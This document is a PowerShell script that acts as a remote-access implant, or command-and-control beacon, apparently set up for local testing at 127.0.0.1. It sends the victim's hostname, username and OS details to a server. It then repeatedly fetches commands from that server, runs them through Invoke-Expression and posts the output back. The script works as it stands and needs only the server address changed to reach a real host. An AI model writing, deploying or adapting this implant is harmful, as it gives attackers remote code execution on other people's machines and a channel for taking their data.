$ServerIP = "127.0.0.1"
$ServerPort = "80"
$WAITTIME = "1" # in seconds

# Get system information
$Hostname = $env:COMPUTERNAME
$userRaw = whoami
$Username = ($userRaw -split '\\' | Select-Object -Last 1).Trim()
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$OSNAME = $os.Caption -replace "Microsoft ", ""
$Version = $os.Version
$Arch = $os.OSArchitecture
$ID = "$Username@$Hostname"
$Server = "http://$ServerIP`:$ServerPort"

# Register client information
try {
    Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{
        id = $ID
        hostname = $Hostname
        username = $Username
        os = $OSNAME
        version = $Version
        arch = $Arch
    }
    Write-Host "[*] Registered successfully"
} catch {
    Write-Host "[!] Error during registration: $_"
    exit
}

# Command loop to fetch and execute commands
while ($true) {
    try {
        # Retrieve command from the server
        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
        
        if ($Cmd) {
            # Execute the command and capture the result
            $Result = try {
                Invoke-Expression $Cmd | Out-String
            } catch {
                # Capture errors and return them
                $_ | Out-String
            }

            # Send the result back to the server
            try {
                Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{
                    cmd = $Cmd
                    result = $Result
                }
                #Write-Host "[*] Command executed and result sent"
            } catch {
                #Write-Host "[!] Error sending result: $_"
            }
        }
    } catch {
        #Write-Host "[!] Error while fetching command: $_"
    }
    
    # Sleep for 1 second before checking again
    Start-Sleep -Seconds $WAITTIME
}
